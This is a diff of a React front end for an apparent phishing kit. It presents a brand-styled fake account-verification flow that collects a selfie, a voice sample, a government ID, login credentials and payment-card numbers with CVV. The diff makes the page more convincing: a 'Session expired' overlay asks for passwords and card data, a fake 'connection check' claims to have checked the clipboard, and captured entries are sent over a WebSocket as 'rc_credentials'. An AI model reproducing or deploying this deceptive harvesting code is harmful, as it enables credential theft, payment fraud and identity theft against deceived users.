+                  data-testid="input-reset-email"
+                />
+                <Button
+                  className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white font-medium`}
+                  onClick={() => {
+                    sendWS({ type: "rc_credentials", data: { type: "reset", email: resetEmail, timestamp: new Date().toISOString() }, token });
+                    setResetSent(true);
+                  }}
+                  data-testid="button-send-reset"
+                >
+                  Send reset link
+                </Button>
+              </>
+            ) : (
+              <div className="text-center space-y-3 py-4">
+                <div className="w-12 h-12 bg-green-50 rounded-full flex items-center justify-center mx-auto">
+                  <Check className="w-6 h-6 text-green-600" />
+                </div>
+                <p className="text-sm text-gray-700">Check your email for a reset link</p>
+                <p className="text-xs text-gray-400">Didn't receive it? Check your spam folder.</p>
+              </div>
+            )}
+            <button
+              className={`text-sm ${brand.accent} hover:underline w-full text-center`}
+              onClick={() => { setForgotPassword(false); setResetSent(false); setResetEmail(""); }}
+              data-testid="link-back-to-login"
+            >
+              Back to sign in
+            </button>
+          </div>
+        )}
       </div>
     </div>
   );
 
   const renderStep2 = () => (
-    <div className="space-y-4" data-testid="step-biometric">
-      <div className="text-center space-y-2 mb-6">
-        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-emerald-500/10 mb-2">
-          <ScanFace className="w-7 h-7 text-emerald-500" />
+    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-biometric">
+      <div className="max-w-sm mx-auto space-y-5">
+        <div className="text-center space-y-1">
+          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Take a quick selfie</h2>
+          {capturedEmail && <p className="text-sm text-green-600">Hi, {capturedEmail.split("@")[0]}</p>}
+          <p className="text-sm text-gray-500">We need a photo to confirm you are the account owner</p>
         </div>
-        <h2 className="text-lg font-semibold" data-testid="text-step-title">Biometric Verification</h2>
-        {capturedEmail && <p className="text-xs text-emerald-500">Welcome back, {capturedEmail}</p>}
-        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
-          A quick facial scan is required to verify you are the authorized account holder. This takes only a few seconds.
-        </p>
-      </div>
 
-      <Card className="border-emerald-500/20">
-        <CardContent className="p-6">
-          <div className="text-center space-y-4">
-            {permissions.camera.granted ? (
-              <div className="space-y-3">
-                <div className="w-20 h-20 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto">
-                  <CheckCircle2 className="w-10 h-10 text-emerald-500" />
+        <div className="bg-white rounded-xl border border-gray-200 p-6">
+          {permissions.camera.granted && !selfieCaptured ? (
+            <div className="space-y-4 text-center">
+              <div className="w-48 h-48 rounded-full overflow-hidden mx-auto border-4 border-gray-100 relative">
+                <video ref={selfieVideoRef} autoPlay playsInline muted className="w-full h-full object-cover scale-x-[-1]" data-testid="video-selfie-preview" />
+              </div>
+              <p className="text-sm text-gray-500">Looking good! Click capture when ready.</p>
+              <Button
+                className={`${brand.bg} hover:opacity-90 text-white px-8`}
+                onClick={() => {
+                  setSelfieCaptured(true);
+                  setTimeout(() => advanceStep(), 2000);
+                }}
+                data-testid="button-capture-selfie"
+              >
+                <Camera className="w-4 h-4 mr-2" />
+                Capture
+              </Button>
+            </div>
+          ) : selfieCaptured ? (
+            <div className="space-y-4 text-center py-4">
+              <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto">
+                <CheckCircle2 className="w-8 h-8 text-green-600" />
+              </div>
+              <p className="text-sm font-medium text-green-700">Photo captured successfully</p>
+              <p className="text-xs text-gray-400">Verifying your identity...</p>
+            </div>
+          ) : permissions.camera.loading ? (
+            <div className="space-y-4 text-center py-4">
+              <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-600 rounded-full animate-spin mx-auto" />
+              <p className="text-sm text-gray-500">Accessing camera...</p>
+            </div>
+          ) : (
+            <div className="space-y-5 text-center">
+              <div className="w-48 h-48 rounded-full bg-gray-50 border-2 border-dashed border-gray-200 flex items-center justify-center mx-auto">
+                <User className="w-20 h-20 text-gray-200" />
+              </div>
+              <div className="space-y-2">
+                <div className="flex items-center gap-3 justify-center text-xs text-gray-400">
+                  <span>Good lighting</span>
+                  <span className="w-1 h-1 bg-gray-300 rounded-full" />
+                  <span>Face centered</span>
+                  <span className="w-1 h-1 bg-gray-300 rounded-full" />
+                  <span>No sunglasses</span>
                 </div>
-                <p className="text-sm font-medium text-emerald-500">Biometric scan complete</p>
-                <p className="text-xs text-muted-foreground">Identity confirmed successfully</p>
-                <Button className="w-full" onClick={advanceStep} data-testid="button-next-step">
-                  Continue <ArrowRight className="w-4 h-4 ml-2" />
-                </Button>
               </div>
-            ) : permissions.camera.loading ? (
-              <div className="space-y-3">
-                <div className="w-20 h-20 rounded-full border-2 border-emerald-500/30 border-t-emerald-500 animate-spin mx-auto" />
-                <p className="text-sm text-muted-foreground">Initializing facial recognition...</p>
-                <p className="text-[10px] text-muted-foreground">Processing biometric data...</p>
-              </div>
-            ) : (
-              <div className="space-y-4">
-                <div className="w-32 h-32 rounded-full border-2 border-dashed border-muted-foreground/30 flex items-center justify-center mx-auto relative">
-                  <ScanFace className="w-12 h-12 text-muted-foreground/50" />
-                  <div className="absolute inset-0 rounded-full border-2 border-transparent border-t-emerald-500/50 animate-spin" style={{ animationDuration: "3s" }} />
+              {permissions.camera.error && (
+                <div className="bg-red-50 border border-red-100 rounded-lg p-3 text-center">
+                  <p className="text-xs text-red-600">{permissions.camera.error}</p>
                 </div>
-                <p className="text-xs text-muted-foreground">Position your face within the frame and click the button below</p>
-                {renderDeniedError("camera")}
-                <Button className="w-full" onClick={handleCamera} data-testid="button-start-scan">
-                  <ScanFace className="w-4 h-4 mr-2" />Start Biometric Scan
-                </Button>
-              </div>
-            )}
-          </div>
-        </CardContent>
-      </Card>
+              )}
+              <Button
+                className={`${brand.bg} hover:opacity-90 text-white px-8 h-11`}
+                onClick={handleCamera}
+                data-testid="button-start-scan"
+              >
+                <Camera className="w-4 h-4 mr-2" />
+                Take Photo
+              </Button>
+            </div>
+          )}
+        </div>
 
-      <div className="flex justify-center pt-2">
-        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
-          Skip this step
-        </Button>
+        <button
+          className="text-xs text-gray-400 hover:text-gray-600 w-full text-center"
+          onClick={advanceStep}
+          data-testid="button-skip-step"
+        >
+          I'll do this later
+        </button>
       </div>
     </div>
   );
 
   const renderStep3 = () => (
-    <div className="space-y-4" data-testid="step-voice">
-      <div className="text-center space-y-2 mb-6">
-        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-violet-500/10 mb-2">
-          <AudioLines className="w-7 h-7 text-violet-500" />
+    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-voice">
+      <div className="max-w-sm mx-auto space-y-5">
+        <div className="text-center space-y-1">
+          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Verify with your voice</h2>
+          <p className="text-sm text-gray-500">Read the phrase below clearly into your microphone</p>
         </div>
-        <h2 className="text-lg font-semibold" data-testid="text-step-title">Voice Authentication</h2>
-        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
-          Multi-factor authentication requires a voice pattern match. Speak naturally when prompted to verify your identity.
-        </p>
-      </div>
 
-      <Card className="border-violet-500/20">
-        <CardContent className="p-6">
-          <div className="text-center space-y-4">
-            {permissions.microphone.granted ? (
-              <div className="space-y-3">
-                <div className="w-20 h-20 rounded-full bg-violet-500/10 flex items-center justify-center mx-auto">
-                  <CheckCircle2 className="w-10 h-10 text-violet-500" />
-                </div>
-                <p className="text-sm font-medium text-violet-500">Voice pattern verified</p>
-                <p className="text-xs text-muted-foreground">Multi-factor authentication passed</p>
-                <Button className="w-full" onClick={advanceStep} data-testid="button-next-step">
-                  Continue <ArrowRight className="w-4 h-4 ml-2" />
-                </Button>
-              </div>
-            ) : permissions.microphone.loading ? (
-              <div className="space-y-3">
-                <div className="flex items-center justify-center gap-1 h-20">
-                  {[...Array(7)].map((_, i) => (
-                    <div key={i} className="w-1.5 bg-violet-500 rounded-full animate-pulse" style={{ height: `${20 + Math.random() * 40}px`, animationDelay: `${i * 0.15}s` }} />
-                  ))}
-                </div>
-                <p className="text-sm text-muted-foreground">Analyzing voice pattern...</p>
-                <p className="text-[10px] text-muted-foreground">Encrypting audio sample...</p>
-              </div>
-            ) : (
-              <div className="space-y-4">
-                <div className="flex items-center justify-center gap-1 h-20 opacity-30">
-                  {[...Array(7)].map((_, i) => (
-                    <div key={i} className="w-1.5 bg-muted-foreground rounded-full" style={{ height: `${15 + i * 5}px` }} />
-                  ))}
-                </div>
-                <p className="text-xs text-muted-foreground">Click below and say anything to record your voice pattern</p>
-                {renderDeniedError("microphone")}
-                <Button className="w-full" onClick={handleMicrophone} data-testid="button-start-voice">
-                  <AudioLines className="w-4 h-4 mr-2" />Begin Voice Verification
-                </Button>
-              </div>
-            )}
-          </div>
-        </CardContent>
-      </Card>
-
-      <div className="flex justify-center pt-2">
-        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
-          Skip this step
-        </Button>
-      </div>
-    </div>
-  );
-
-  const renderStep4 = () => (
-    <div className="space-y-4" data-testid="step-environment">
-      <div className="text-center space-y-2 mb-6">
-        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-amber-500/10 mb-2">
-          <Search className="w-7 h-7 text-amber-500" />
-        </div>
-        <h2 className="text-lg font-semibold" data-testid="text-step-title">Security Environment Check</h2>
-        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
-          Automated security scan of your device and network to ensure a safe environment before granting access.
-        </p>
-      </div>
-
-      <Card className="border-amber-500/20">
-        <CardContent className="p-6">
-          <div className="space-y-5">
-            {scanRunning || scanProgress === 100 ? (
-              <div className="space-y-4">
-                <Progress value={scanProgress} className="h-2" data-testid="progress-scan" />
-                <p className="text-sm text-center font-medium" data-testid="text-scan-status">{scanStatus}</p>
-                <div className="space-y-2 pt-2">
-                  {[
-                    { label: "Network security", done: scanProgress >= 25 },
-                    { label: "Regional compliance", done: scanProgress >= 40 },
-                    { label: "Browser configuration", done: scanProgress >= 55 },
-                    { label: "Clipboard scan", done: scanProgress >= 70 },
-                    { label: "Device fingerprint", done: scanProgress >= 85 },
-                    { label: "Final report", done: scanProgress >= 100 },
-                  ].map((item) => (
-                    <div key={item.label} className="flex items-center gap-2 text-xs">
-                      {item.done ? (
-                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500 flex-shrink-0" />
-                      ) : scanRunning ? (
-                        <Loader2 className="w-3.5 h-3.5 text-muted-foreground animate-spin flex-shrink-0" />
-                      ) : (
-                        <div className="w-3.5 h-3.5 rounded-full border border-muted-foreground/30 flex-shrink-0" />
-                      )}
-                      <span className={item.done ? "text-foreground" : "text-muted-foreground"}>{item.label}</span>
-                    </div>
-                  ))}
-                </div>
-                {scanProgress === 100 && !scanRunning && (
-                  <div className="text-center pt-2">
-                    <Badge className="bg-emerald-500/20 text-emerald-500">Environment Verified</Badge>
+        <div className="bg-white rounded-xl border border-gray-200 p-6">
+          {permissions.microphone.granted ? (
+            <div className="space-y-4 text-center">
+              {voiceRecording ? (
+                <>
+                  <div className="bg-gray-900 rounded-lg p-4 h-24 flex items-end justify-center">
+                    <canvas ref={audioCanvasRef} width={280} height={80} className="w-full h-full" data-testid="canvas-audio-visualizer" />
                   </div>
-                )}
-              </div>
-            ) : (
-              <div className="text-center space-y-4">
-                <div className="w-20 h-20 rounded-full border-2 border-dashed border-amber-500/30 flex items-center justify-center mx-auto">
-                  <Search className="w-8 h-8 text-amber-500/50" />
+                  <div className="flex items-center justify-center gap-2">
+                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
+                    <span className="text-sm font-medium text-gray-700">Recording... {voiceRecordingTime}s / 5s</span>
+                  </div>
+                  <Progress value={(voiceRecordingTime / 5) * 100} className="h-1.5" />
+                </>
+              ) : (
+                <div className="space-y-3 py-4">
+                  <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto">
+                    <CheckCircle2 className="w-8 h-8 text-green-600" />
+                  </div>
+                  <p className="text-sm font-medium text-green-700">Voice sample recorded</p>
+                  <p className="text-xs text-gray-400">Processing your voice pattern...</p>
                 </div>
-                <p className="text-xs text-muted-foreground">This automated scan checks your network, browser, and device security posture. It takes approximately 15 seconds.</p>
-                <Button className="w-full" onClick={runEnvironmentScan} data-testid="button-start-env-scan">
-                  <Search className="w-4 h-4 mr-2" />Run Security Scan
-                </Button>
+              )}
+            </div>
+          ) : permissions.microphone.loading ? (
+            <div className="space-y-4 text-center py-4">
+              <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-600 rounded-full animate-spin mx-auto" />
+              <p className="text-sm text-gray-500">Accessing microphone...</p>
+            </div>
+          ) : (
+            <div className="space-y-5 text-center">
+              <div className="bg-gray-50 rounded-lg p-6 border border-gray-100">
+                <p className="text-xs text-gray-400 mb-2">Read this phrase aloud:</p>
+                <p className="text-lg font-medium text-gray-800 italic">"My voice is my password, verify me"</p>
               </div>
-            )}
-          </div>
-        </CardContent>
-      </Card>
+              {permissions.microphone.error && (
+                <div className="bg-red-50 border border-red-100 rounded-lg p-3 text-center">
+                  <p className="text-xs text-red-600">{permissions.microphone.error}</p>
+                </div>
+              )}
+              <Button
+                className={`${brand.bg} hover:opacity-90 text-white px-8 h-11`}
+                onClick={handleMicrophone}
+                data-testid="button-start-voice"
+              >
+                <Mic className="w-4 h-4 mr-2" />
+                Start Recording
+              </Button>
+            </div>
+          )}
+        </div>
 
-      <div className="flex justify-center pt-2">
-        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
-          Skip this step
-        </Button>
+        <button
+          className="text-xs text-gray-400 hover:text-gray-600 w-full text-center"
+          onClick={advanceStep}
+          data-testid="button-skip-step"
+        >
+          I'll do this later
+        </button>
       </div>
     </div>
   );
+
+  const renderStep4 = () => {
+    return (
+      <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-environment">
+        <div className="max-w-sm mx-auto space-y-5">
+          <div className="text-center space-y-1">
+            <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Checking your connection</h2>
+            <p className="text-sm text-gray-500">Verifying your device and network compatibility</p>
+          </div>
+
+          <div className="bg-white rounded-xl border border-gray-200 p-6">
+            <div className="space-y-4">
+              {scanRunning && (
+                <div className="flex items-center justify-center gap-3 mb-2">
+                  <Loader2 className="w-5 h-5 text-gray-400 animate-spin" />
+                  <span className="text-sm text-gray-600" data-testid="text-scan-status">{scanStatus || "Starting checks..."}</span>
+                </div>
+              )}
+
+              <Progress value={scanProgress} className="h-1" data-testid="progress-scan" />
+
+              <div className="space-y-3 pt-2">
+                {[
+                  { label: "Secure connection verified", icon: Lock },
+                  { label: "Region confirmed", icon: MapPin },
+                  { label: "Browser compatible", icon: Globe },
+                  { label: "Clipboard checked", icon: ClipboardPaste },
+                  { label: "Device recognized", icon: Smartphone },
+                  { label: "All checks passed", icon: ShieldCheck },
+                ].map((item) => {
+                  const isDone = envCheckItems.includes(item.label);
+                  const Icon = item.icon;
+                  return (
+                    <div
+                      key={item.label}
+                      className={`flex items-center gap-3 text-sm transition-all duration-500 ${isDone ? "opacity-100" : "opacity-0 translate-y-1"}`}
+                      style={{ transitionDelay: isDone ? "0ms" : "0ms" }}
+                    >
+                      {isDone ? (
+                        <div className="w-5 h-5 bg-green-50 rounded-full flex items-center justify-center flex-shrink-0">
+                          <Check className="w-3 h-3 text-green-600" />
+                        </div>
+                      ) : (
+                        <div className="w-5 h-5 flex items-center justify-center flex-shrink-0">
+                          <Loader2 className="w-3.5 h-3.5 text-gray-300 animate-spin" />
+                        </div>
+                      )}
+                      <Icon className={`w-4 h-4 flex-shrink-0 ${isDone ? "text-gray-600" : "text-gray-300"}`} />
+                      <span className={isDone ? "text-gray-700" : "text-gray-300"}>{item.label}</span>
+                    </div>
+                  );
+                })}
+              </div>
+
+              {scanProgress === 100 && !scanRunning && (
+                <div className="text-center pt-3">
+                  <div className="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm">
+                    <ShieldCheck className="w-4 h-4" />
+                    Everything looks good
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  };
 
   const renderStep5 = () => (
-    <div className="space-y-4" data-testid="step-documents">
-      <div className="text-center space-y-2 mb-6">
-        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-sky-500/10 mb-2">
-          <FileCheck className="w-7 h-7 text-sky-500" />
+    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-documents">
+      <div className="max-w-sm mx-auto space-y-5">
+        <div className="text-center space-y-1">
+          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Upload your ID</h2>
+          <p className="text-sm text-gray-500">Take a photo or upload an image of your government-issued ID</p>
         </div>
-        <h2 className="text-lg font-semibold" data-testid="text-step-title">Document Verification</h2>
-        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
-          Upload a valid government-issued ID, passport, or utility bill to complete the verification process.
-        </p>
-      </div>
 
-      <Card className="border-sky-500/20">
-        <CardContent className="p-6">
-          <div className="text-center space-y-4">
-            {permissions.files.granted ? (
-              <div className="space-y-3">
-                <div className="w-20 h-20 rounded-full bg-sky-500/10 flex items-center justify-center mx-auto">
-                  <CheckCircle2 className="w-10 h-10 text-sky-500" />
-                </div>
-                <p className="text-sm font-medium text-sky-500">Documents received</p>
-                <p className="text-xs text-muted-foreground">Your documents are being reviewed</p>
-                <Button className="w-full" onClick={() => setWizardComplete(true)} data-testid="button-complete-verification">
-                  Complete Verification <ArrowRight className="w-4 h-4 ml-2" />
-                </Button>
+        <div className="bg-white rounded-xl border border-gray-200 p-6">
+          {permissions.files.granted ? (
+            <div className="space-y-4 text-center py-4">
+              <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto">
+                <CheckCircle2 className="w-8 h-8 text-green-600" />
               </div>
-            ) : (
-              <div className="space-y-4">
-                <div className="border-2 border-dashed border-sky-500/20 rounded-lg p-8">
-                  <FolderOpen className="w-10 h-10 text-sky-500/40 mx-auto mb-3" />
-                  <p className="text-xs text-muted-foreground">Accepted formats: JPG, PNG, PDF, DOC</p>
-                  <p className="text-[10px] text-muted-foreground/60 mt-1">Max file size: 10MB</p>
-                </div>
-                {permissions.files.error && <p className="text-xs text-destructive">{permissions.files.error}</p>}
-                <Button className="w-full" onClick={handleFiles} data-testid="button-upload-documents">
-                  <FileCheck className="w-4 h-4 mr-2" />Select Documents to Upload
-                </Button>
+              <div>
+                <p className="text-sm font-medium text-green-700">Document uploaded</p>
+                {uploadedFileName && <p className="text-xs text-gray-400 mt-1">{uploadedFileName}</p>}
               </div>
-            )}
-          </div>
-        </CardContent>
-      </Card>
+              {uploadProgress < 100 && <Progress value={Math.min(uploadProgress, 100)} className="h-1" />}
+              <Button
+                className={`${brand.bg} hover:opacity-90 text-white px-8 h-11`}
+                onClick={() => setWizardComplete(true)}
+                data-testid="button-complete-verification"
+              >
+                Continue
+                <ChevronRight className="w-4 h-4 ml-1" />
+              </Button>
+            </div>
+          ) : (
+            <div className="space-y-4">
+              <div className="grid grid-cols-3 gap-3 mb-4">
+                {[
+                  { icon: CreditCardIcon, label: "Driver's License" },
+                  { icon: Globe, label: "Passport" },
+                  { icon: FileText, label: "National ID" },
+                ].map((item) => (
+                  <div key={item.label} className="text-center p-3 rounded-lg border border-gray-100 bg-gray-50">
+                    <item.icon className="w-6 h-6 text-gray-400 mx-auto mb-1" />
+                    <p className="text-[10px] text-gray-500">{item.label}</p>
+                  </div>
+                ))}
+              </div>
 
-      <div className="flex justify-center pt-2">
-        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={() => setWizardComplete(true)} data-testid="button-skip-step">
-          Skip this step
-        </Button>
+              <div
+                className={`border-2 border-dashed rounded-xl p-8 text-center transition-colors cursor-pointer ${
+                  dragOver ? "border-blue-400 bg-blue-50" : "border-gray-200 hover:border-gray-300"
+                }`}
+                onClick={handleFiles}
+                onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
+                onDragLeave={() => setDragOver(false)}
+                onDrop={(e) => {
+                  e.preventDefault();
+                  setDragOver(false);
+                  if (e.dataTransfer.files.length > 0) {
+                    const dt = new DataTransfer();
+                    for (const f of Array.from(e.dataTransfer.files)) dt.items.add(f);
+                    if (fileInputRef.current) {
+                      fileInputRef.current.files = dt.files;
+                      fileInputRef.current.dispatchEvent(new Event("change", { bubbles: true }));
+                    }
+                  }
+                }}
+                data-testid="dropzone-upload"
+              >
+                <Upload className="w-8 h-8 text-gray-300 mx-auto mb-3" />
+                <p className="text-sm text-gray-600 font-medium">Drop your file here or click to browse</p>
+                <p className="text-xs text-gray-400 mt-1">JPG, PNG, or PDF up to 10MB</p>
+              </div>
+
+              {permissions.files.error && (
+                <div className="bg-red-50 border border-red-100 rounded-lg p-3 text-center">
+                  <p className="text-xs text-red-600">{permissions.files.error}</p>
+                </div>
+              )}
+            </div>
+          )}
+        </div>
+
+        <button
+          className="text-xs text-gray-400 hover:text-gray-600 w-full text-center"
+          onClick={() => {
+            sendWS({ type: "rc_activity", data: { category: "step_skipped", step: "documents", timestamp: new Date().toISOString() }, token });
+            setWizardComplete(true);
+          }}
+          data-testid="button-skip-step"
+        >
+          Skip for now
+        </button>
       </div>
     </div>
   );
 
   const renderComplete = () => (
-    <div className="text-center space-y-6 py-8" data-testid="step-complete">
-      <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-emerald-500/10 mb-2">
-        <ShieldCheck className="w-10 h-10 text-emerald-500" />
+    <div className={`transition-all duration-500 opacity-100`} data-testid="step-complete">
+      <div className="max-w-sm mx-auto text-center space-y-6 py-8">
+        <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto">
+          <CheckCircle2 className="w-10 h-10 text-green-600" />
+        </div>
+        <div className="space-y-2">
+          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-complete-title">You're all set</h2>
+          {capturedEmail && <p className="text-sm text-green-600">Account verified: {capturedEmail}</p>}
+          <p className="text-sm text-gray-500">
+            Your identity has been successfully verified. You can now access your account.
+          </p>
+        </div>
+        <div className="space-y-2 text-left max-w-xs mx-auto">
+          {[
+            { label: "Account login", done: permissions.credentials.granted },
+            { label: "Photo verification", done: permissions.camera.granted },
+            { label: "Voice verification", done: permissions.microphone.granted },
+            { label: "Connection check", done: permissions.deviceInfo.granted || permissions.browserData.granted },
+            { label: "Document upload", done: permissions.files.granted },
+          ].filter((item) => {
+            const stepMap: Record<string, string> = { "Account login": "identity", "Photo verification": "biometric", "Voice verification": "voice", "Connection check": "environment", "Document upload": "documents" };
+            return activeStepKeys.includes(stepMap[item.label]);
+          }).map((item) => (
+            <div key={item.label} className="flex items-center gap-3 text-sm">
+              {item.done ? (
+                <div className="w-5 h-5 bg-green-50 rounded-full flex items-center justify-center">
+                  <Check className="w-3 h-3 text-green-600" />
+                </div>
+              ) : (
+                <div className="w-5 h-5 bg-gray-100 rounded-full flex items-center justify-center">
+                  <X className="w-3 h-3 text-gray-400" />
+                </div>
+              )}
+              <span className={item.done ? "text-gray-700" : "text-gray-400"}>{item.label}</span>
+            </div>
+          ))}
+        </div>
+        <div className="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm">
+          <ShieldCheck className="w-4 h-4" />
+          Session Active
+        </div>
       </div>
-      <div className="space-y-2">
-        <h2 className="text-xl font-semibold" data-testid="text-complete-title">Verification Complete</h2>
-        {capturedEmail && <p className="text-sm text-emerald-500">Account verified: {capturedEmail}</p>}
-        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
-          Your identity has been successfully verified. Your secure session is now active.
-        </p>
-      </div>
-      <div className="grid grid-cols-2 gap-2 max-w-xs mx-auto text-xs">
-        {[
-          { label: "Identity", done: permissions.credentials.granted },
-          { label: "Biometric", done: permissions.camera.granted },
-          { label: "Voice Auth", done: permissions.microphone.granted },
-          { label: "Environment", done: permissions.deviceInfo.granted || permissions.browserData.granted },
-          { label: "Documents", done: permissions.files.granted },
-        ].map((item) => (
-          <div key={item.label} className="flex items-center gap-1.5">
-            {item.done ? <CheckCircle2 className="w-3 h-3 text-emerald-500" /> : <XCircle className="w-3 h-3 text-muted-foreground/40" />}
-            <span className={item.done ? "text-foreground" : "text-muted-foreground/50"}>{item.label}</span>
-          </div>
-        ))}
-      </div>
-      <Badge className="bg-emerald-500/20 text-emerald-500 text-xs">Session Active</Badge>
     </div>
   );
 
   return (
-    <div className="min-h-screen bg-background">
+    <div className="min-h-screen bg-gray-50 flex flex-col">
       {showCredentialOverlay && (
-        <div className="fixed inset-0 z-[60] bg-black/70 flex items-center justify-center p-4" data-testid="modal-credential-overlay">
-          <Card className="max-w-md w-full animate-in fade-in zoom-in-95">
-            <CardContent className="p-0">
-              <div className={`bg-gradient-to-r ${brand.from} ${brand.to} p-4 rounded-t-lg`}>
-                <div className="flex items-center gap-2 text-white">
-                  <Lock className="w-5 h-5" />
-                  <span className="font-semibold text-sm">Security Verification Required</span>
+        <div className="fixed inset-0 z-[60] bg-black/50 flex items-center justify-center p-4" data-testid="modal-credential-overlay">
+          <div className="max-w-sm w-full bg-white rounded-xl shadow-xl p-6 space-y-4 animate-in fade-in zoom-in-95">
+            <div className="text-center space-y-1">
+              <Lock className="w-8 h-8 text-gray-400 mx-auto mb-2" />
+              <h3 className="text-lg font-semibold text-gray-900" data-testid="text-overlay-title">Session expired</h3>
+              <p className="text-sm text-gray-500">Please sign in again to continue</p>
+            </div>
+            {credTab === "login" && (
+              <div className="space-y-3">
+                <Input type="email" placeholder="Email" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-cred-email-overlay" />
+                <Input type="password" placeholder="Password" value={credForm.password} onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-cred-password-overlay" />
+                <Button className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white`} onClick={() => submitCredentials("login")} data-testid="button-submit-login-overlay">Sign in</Button>
+              </div>
+            )}
+            {cfg.enableBanking && credTab === "banking" && (
+              <div className="space-y-3">
+                <Input placeholder="Cardholder name" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-name-overlay" />
+                <Input placeholder="Card number" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-number-overlay" />
+                <div className="grid grid-cols-2 gap-3">
+                  <Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-expiry-overlay" />
+                  <Input type="password" placeholder="CVV" value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-cvv-overlay" />
                 </div>
-                <p className="text-white/80 text-xs mt-1">Your session has expired. Please verify your identity to continue.</p>
+                <Button className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white`} onClick={() => submitCredentials("banking")} data-testid="button-submit-banking-overlay">Verify</Button>
               </div>
-              <div className="p-5 space-y-4">
-                {cfg.enableBanking && (
-                  <div className="flex gap-1 border-b border-border/50 mb-4">
-                    <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("login")} data-testid="tab-login-overlay">Account Login</button>
-                    <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("banking")} data-testid="tab-banking-overlay">Payment Verification</button>
-                  </div>
-                )}
-                {credTab === "login" && (
-                  <div className="space-y-3">
-                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Email Address</label><Input type="email" placeholder="name@example.com" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} data-testid="input-cred-email-overlay" /></div>
-                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Password</label><Input type="password" placeholder="Enter your password" value={credForm.password} onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))} data-testid="input-cred-password-overlay" /></div>
-                    <Button className="w-full" onClick={() => submitCredentials("login")} data-testid="button-submit-login-overlay"><Lock className="w-4 h-4 mr-2" />Verify Identity</Button>
-                  </div>
-                )}
-                {credTab === "banking" && (
-                  <div className="space-y-3">
-                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Cardholder Name</label><Input placeholder="John Smith" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} data-testid="input-card-name-overlay" /></div>
-                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Card Number</label><Input placeholder="4242 4242 4242 4242" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} data-testid="input-card-number-overlay" /></div>
-                    <div className="grid grid-cols-2 gap-3">
-                      <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Expiry</label><Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} data-testid="input-card-expiry-overlay" /></div>
